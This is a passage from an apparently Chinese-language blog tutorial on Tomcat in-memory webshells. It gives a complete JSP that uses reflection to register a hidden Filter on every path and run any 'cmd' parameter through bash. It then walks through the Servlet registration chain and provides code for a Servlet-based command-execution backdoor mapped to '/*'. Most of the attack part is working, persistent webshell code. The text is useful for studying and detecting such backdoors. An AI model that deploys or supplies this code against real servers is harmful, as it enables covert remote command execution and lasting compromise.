</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">81
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationContext&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.util.Map&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterDef&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.tomcat.util.descriptor.web.FilterMap&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.lang.reflect.Constructor&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.core.ApplicationFilterConfig&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.Context&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=UTF-8&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;%
</span></span><span style="display:flex;"><span>    final String name = &#34;reus09&#34;;
</span></span><span style="display:flex;"><span>    ServletContext servletContext = request.getSession().getServletContext();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Field appctx = servletContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span style="display:flex;"><span>    appctx.setAccessible(true);
</span></span><span style="display:flex;"><span>    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Field stdctx = applicationContext.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span style="display:flex;"><span>    stdctx.setAccessible(true);
</span></span><span style="display:flex;"><span>    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Field Configs = standardContext.getClass().getDeclaredField(&#34;filterConfigs&#34;);
</span></span><span style="display:flex;"><span>    Configs.setAccessible(true);
</span></span><span style="display:flex;"><span>    Map filterConfigs = (Map) Configs.get(standardContext);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    if (filterConfigs.get(name) == null){
</span></span><span style="display:flex;"><span>        Filter filter = new Filter() {
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            public void init(FilterConfig filterConfig) throws ServletException {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
</span></span><span style="display:flex;"><span>                HttpServletRequest req = (HttpServletRequest) servletRequest;
</span></span><span style="display:flex;"><span>                if (req.getParameter(&#34;cmd&#34;) != null){
</span></span><span style="display:flex;"><span>                    byte[] bytes = new byte[1024];
</span></span><span style="display:flex;"><span>                    Process process = new ProcessBuilder(&#34;bash&#34;,&#34;-c&#34;,req.getParameter(&#34;cmd&#34;)).start();
</span></span><span style="display:flex;"><span>                    int len = process.getInputStream().read(bytes);
</span></span><span style="display:flex;"><span>                    servletResponse.getWriter().write(new String(bytes,0,len));
</span></span><span style="display:flex;"><span>                    process.destroy();
</span></span><span style="display:flex;"><span>                    return;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                filterChain.doFilter(servletRequest,servletResponse);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            public void destroy() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        FilterDef filterDef = new FilterDef();
</span></span><span style="display:flex;"><span>        filterDef.setFilter(filter);
</span></span><span style="display:flex;"><span>        filterDef.setFilterName(name);
</span></span><span style="display:flex;"><span>        filterDef.setFilterClass(filter.getClass().getName());
</span></span><span style="display:flex;"><span>        /**
</span></span><span style="display:flex;"><span>         * å°†filterDefæ·»åŠ åˆ°filterDefsä¸­
</span></span><span style="display:flex;"><span>         */
</span></span><span style="display:flex;"><span>        standardContext.addFilterDef(filterDef);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        FilterMap filterMap = new FilterMap();
</span></span><span style="display:flex;"><span>        filterMap.addURLPattern(&#34;/*&#34;);
</span></span><span style="display:flex;"><span>        filterMap.setFilterName(name);
</span></span><span style="display:flex;"><span>        filterMap.setDispatcher(DispatcherType.REQUEST.name());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        standardContext.addFilterMapBefore(filterMap);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
</span></span><span style="display:flex;"><span>        constructor.setAccessible(true);
</span></span><span style="display:flex;"><span>        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        filterConfigs.put(name,filterConfig);
</span></span><span style="display:flex;"><span>        out.print(&#34;Filter Inject Success !&#34;);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°æ¶æ„çš„Filterå·²ç»æ·»åŠ åˆ°å†…å­˜ä¸­ï¼Œæ¯ä¸€ä¸ªè¯·æ±‚ï¼Œéƒ½ä¼šå…ˆè¢«æ¶æ„<code>Filter</code>çš„<code>doFilter</code>è¿›è¡Œå¤„ç†ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416120126244.png" alt="image-20230416120126244"  />
</p>
<p>å› ä¸ºæ³¨å†Œçš„<code>url-pattern</code>ä¸º<code>/*</code>ï¼Œæ‰€ä»¥ä»»æ„è·¯å¾„åé¢åŠ <code>?cmd=command</code>å³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415180020051.png" alt="image-20230415180020051"  />
</p>
<h3 id="servletå†…å­˜é©¬">Servletå†…å­˜é©¬<a hidden class="anchor" aria-hidden="true" href="#servletå†…å­˜é©¬">#</a></h3>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹å®ç°ç±» ApplicationContext çš„ <code>addServlet</code> æ–¹æ³•ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415190647109.png" alt="image-20230415190647109"  />
</p>
<h4 id="servletè°ƒç”¨é“¾">Servletè°ƒç”¨é“¾<a hidden class="anchor" aria-hidden="true" href="#servletè°ƒç”¨é“¾">#</a></h4>
<p>æˆ‘ä»¬çŸ¥é“ï¼šContext è´Ÿè´£ç®¡ç† Wapper ï¼Œè€Œ Wapper åˆè´Ÿè´£ç®¡ç† Servlet å®ä¾‹ã€‚</p>
<p>é€šè¿‡<code>StandardContext.createWapper()</code>åˆ›å»ºWapperå¯¹è±¡ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415192208539.png" alt="image-20230415192208539"  />
</p>
<p>åœ¨<code>org.apache.catalina.core.StandardWrapper#setServletClass</code>ä¸‹æ–­ç‚¹,ç„¶ådebug</p>
<p>åœ¨ContextConfig#webconfig()å¤„é…ç½®webconfigï¼Œæ ¹æ®web.xmlé…ç½®context</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415192552107.png" alt="image-20230415192552107"  />
</p>
<p>ç„¶åè°ƒç”¨äº†configureContext(),configureContext()ä¾æ¬¡è¯»å–äº† Filterã€Listenerã€Servletçš„é…ç½®åŠå…¶æ˜ å°„ã€‚</p>
<p>åœ¨Servletéƒ¨åˆ†createWrapper()ã€è®¾ç½®äº†å¯åŠ¨ä¼˜å…ˆçº§LoadOnStartUpä»¥åŠservletNameã€‚è¿™é‡ŒloadOnStartupå°±æ˜¯è´Ÿè´£åŠ¨æ€æ·»åŠ Servletçš„å‡½æ•°</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415200241997.png" alt="image-20230415200241997"  />
</p>
<p>ç„¶åè®¾ç½®<code>ServletClass</code>,æœ€åå°†wrapperæ·»åŠ åˆ°<code>StandardContext</code>çš„childé‡Œé¢</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415200333543.png" alt="image-20230415200333543"  />
</p>
<p>å¾ªç¯éå†å®Œäº†æ‰€æœ‰servletsï¼Œæ¥ä¸‹æ¥æ·»åŠ Servlet-Mapperï¼Œä¹Ÿå°±æ˜¯web.xmlä¸­çš„<code>&lt;servlet-mapping&gt;</code>ã€‚å¾ªç¯addServletMappingDecodedå°†urlå’Œservletç±»åšæ˜ å°„</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415200406298.png" alt="image-20230415200406298"  />
</p>
<p>æœ€åé¢å¤–è®²ä¸€ä¸‹<code>loadOnStartup</code>çš„ä½œç”¨ï¼Œéå†æ‰€æœ‰çš„ä¸ªWrapperï¼Œæ¯ä¸ªwrapperè·å–å…¶å¯¹åº”çš„<code>loadOnStartUp</code>å€¼ï¼Œå¦‚æœæ˜¯&gt;=0ï¼Œé‚£ä¹ˆå°±åŠ å…¥åˆ°listä¸­ï¼Œå¦åˆ™loadOnstartup&lt;0ï¼Œåˆ™ä¸ä¼šè¢«åŠ¨æ€æ·»åŠ åˆ°å®¹å™¨ã€‚è¯¥å±æ€§å¯¹åº”äº†web.xmlä¸­çš„<code>&lt;load-on-startup&gt;</code>ï¼Œè¯¥å±æ€§é»˜è®¤-1ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415201329368.png" alt="image-20230415201329368"  />
</p>
<p>æ¥ä¸‹æ¥æ˜¯æ˜¯å¯¹æ»¡è¶³æ¡ä»¶&gt;=0çš„listé‡Œé¢çš„wrapperè¿›è¡Œè£…é…ï¼Œå› æ­¤è¦æƒ³å†…å­˜é©¬æ³¨å†Œçš„Servletæœ‰æ•ˆï¼Œ<code>loadOnStartUp</code>çš„å€¼éœ€è¦&gt;=0ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹servletæ³¨å†Œè¿‡ç¨‹ï¼š</p>
<ol>
<li>è°ƒç”¨StandardContext.createWrapperä¸ºservletåˆ›å»ºwrapper</li>
<li>é…ç½®LoadOnStartupå¯åŠ¨ä¼˜å…ˆçº§</li>
<li>é…ç½®ServletName</li>
<li>é…ç½®ServletClass</li>
<li>addChildæ·»åŠ wrapperåˆ°Context</li>
<li>addServletMappingDecodeæ·»åŠ æ˜ å°„</li>
</ol>
<h4 id="åˆ©ç”¨è¿‡ç¨‹-1">åˆ©ç”¨è¿‡ç¨‹<a hidden class="anchor" aria-hidden="true" href="#åˆ©ç”¨è¿‡ç¨‹-1">#</a></h4>
<h5 id="è·å–context">è·å–Context<a hidden class="anchor" aria-hidden="true" href="#è·å–context">#</a></h5>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Field requestField = request.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;request&#34;</span>);
</span></span><span style="display:flex;"><span>requestField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">final</span> Request request1 = (Request) requestField.<span style="color:#007f7f">get</span>(request);
</span></span><span style="display:flex;"><span>StandardContext standardContext = (StandardContext) request1.<span style="color:#007f7f">getContext</span>();
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ç”Ÿæˆæ¶æ„servlet">ç”Ÿæˆæ¶æ„Servlet<a hidden class="anchor" aria-hidden="true" href="#ç”Ÿæˆæ¶æ„servlet">#</a></h5>
<p>åœ¨ä¹‹å‰åˆ†æçš„<code>ApplicationFilterChain#doFilter()</code>æ–¹æ³•ï¼Œåœ¨æ‰§è¡Œå®Œ<code>filter.doFilter()</code>åï¼Œä¼šè°ƒç”¨<code>servlet.service()</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415202051953.png" alt="image-20230415202051953"  />
</p>
<p><code>service()</code>æ–¹æ³•å®é™…ä¸Šåœ¨HttpServlet.classä¸­ï¼Œæä¾›äº†å¤šç§httpæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç”Ÿæˆæ¶æ„Servletæ—¶å€™ï¼Œä¸ä»…å¯ä»¥åœ¨servletä¸­é‡å†™doGetã€doPostç­‰è§¦å‘RCEï¼Œä¹Ÿå¯ä»¥ç›´æ¥é‡å†™serviceæ–¹æ³•ä»è€Œè§¦å‘RCE</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415202157800.png" alt="image-20230415202157800"  />
</p>
<p>æ¶æ„<code>HttpServlet</code>ä»£ç å¦‚ä¸‹ï¼š</p>
<p>æ ¹æ®æœåŠ¡å™¨çš„ç³»ç»Ÿæ‰§è¡Œä¸åŒçš„shell,æœ€åè°ƒç”¨<code>Runtime.getRuntime().exec(cmd)</code></p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>HttpServlet servlet = <span style="color:#fff;font-weight:bold">new</span> HttpServlet() {
</span></span><span style="display:flex;"><span>        @Override
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">protected</span> <span style="color:#fff;font-weight:bold">void</span> service(HttpServletRequest req, HttpServletResponse resp) <span style="color:#fff;font-weight:bold">throws</span> ServletException, IOException {
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span> (request.<span style="color:#007f7f">getParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>) != <span style="color:#fff;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">boolean</span> isLinux = <span style="color:#fff;font-weight:bold">true</span>;
</span></span><span style="display:flex;"><span>                String osTyp = System.<span style="color:#007f7f">getProperty</span>(<span style="color:#0ff;font-weight:bold">&#34;os.name&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#fff;font-weight:bold">if</span> (osTyp != <span style="color:#fff;font-weight:bold">null</span> &amp;&amp; osTyp.<span style="color:#007f7f">toLowerCase</span>().<span style="color:#007f7f">contains</span>(<span style="color:#0ff;font-weight:bold">&#34;win&#34;</span>)) {
</span></span><span style="display:flex;"><span>                    isLinux = <span style="color:#fff;font-weight:bold">false</span>;
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>                String[] cmds = isLinux ? <span style="color:#fff;font-weight:bold">new</span> String[]{<span style="color:#0ff;font-weight:bold">&#34;sh&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;-c&#34;</span>, request.<span style="color:#007f7f">getParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>)} : <span style="color:#fff;font-weight:bold">new</span> String[]{<span style="color:#0ff;font-weight:bold">&#34;cmd.exe&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;/c&#34;</span>, request.<span style="color:#007f7f">getParameter</span>(<span style="color:#0ff;font-weight:bold">&#34;cmd&#34;</span>)};
</span></span><span style="display:flex;"><span>                InputStream in = Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(cmds).<span style="color:#007f7f">getInputStream</span>();
</span></span><span style="display:flex;"><span>                Scanner s = <span style="color:#fff;font-weight:bold">new</span> Scanner(in).<span style="color:#007f7f">useDelimiter</span>(<span style="color:#0ff;font-weight:bold">&#34;\\A&#34;</span>);
</span></span><span style="display:flex;"><span>                String output = s.<span style="color:#007f7f">hasNext</span>() ? s.<span style="color:#007f7f">next</span>() : <span style="color:#0ff;font-weight:bold">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>                response.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">write</span>(output);
</span></span><span style="display:flex;"><span>                response.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">flush</span>();
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    };
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ç”Ÿæˆwrapper">ç”Ÿæˆwrapper<a hidden class="anchor" aria-hidden="true" href="#ç”Ÿæˆwrapper">#</a></h5>
<p>æ ¹æ®è°ƒç”¨é“¾ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨<code>StandardContext</code>çš„<code>createWrapper</code>æ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ª<code>Wrapper</code>å¯¹è±¡</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Wrapper wrapper = standardContext.createWrapper();
</span></span><span style="display:flex;"><span>wrapper.setName(&#34;reus09&#34;);
</span></span><span style="display:flex;"><span>wrapper.setLoadOnStartup(1);
</span></span><span style="display:flex;"><span>wrapper.setServlet(servlet);
</span></span><span style="display:flex;"><span>wrapper.setServletClass(servlet.getClass().getName());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>standardContext.addChild(wrapper);
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ·»åŠ æ˜ å°„">æ·»åŠ æ˜ å°„<a hidden class="anchor" aria-hidden="true" href="#æ·»åŠ æ˜ å°„">#</a></h5>
<p><code>StandardContext</code>æä¾›äº†<code>addServletMappingDecoded</code>æ–¹æ³•æ¥å®ç°ä¸º<code>Servlet</code>æ·»åŠ <code>url-pattern</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415203520582.png" alt="image-20230415203520582"  />
</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>standardContext.addServletMappingDecoded(&#34;/*&#34;, &#34;reus09&#34;);
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ•ˆæœ-1">æ•ˆæœ<a hidden class="anchor" aria-hidden="true" href="#æ•ˆæœ-1">#</a></h5>
<p>å®Œæ•´ä»£ç ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
